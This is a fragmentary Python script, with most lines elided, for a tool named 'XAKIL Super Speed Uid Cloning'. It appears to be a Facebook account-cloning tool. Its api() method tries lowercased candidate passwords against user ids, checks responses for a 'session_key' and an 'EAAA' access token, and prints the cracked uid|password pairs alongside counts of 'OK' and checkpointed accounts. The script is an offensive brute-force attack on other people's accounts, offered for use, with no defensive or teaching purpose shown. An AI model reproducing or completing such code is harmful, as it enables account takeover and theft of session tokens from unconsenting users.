...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/xark.xuckerberg1")
...
def notice():
	...
	subprocess.check_output(["am", "start", "https://m.me/xark.xuckerberg1"])
...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWARNING  : Don't Go Forget Allah😊🖤
\033[1;90m══════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %sXAKIL Super Speed Uid Cloning"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SS_OLD] : %s/%s -> \033[0;92m [ SS-OK:%s ]- \033[0;91m[SS-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;91m[XAKIL-CP] %s|%s\033[0;97m         "%(uid, pw))
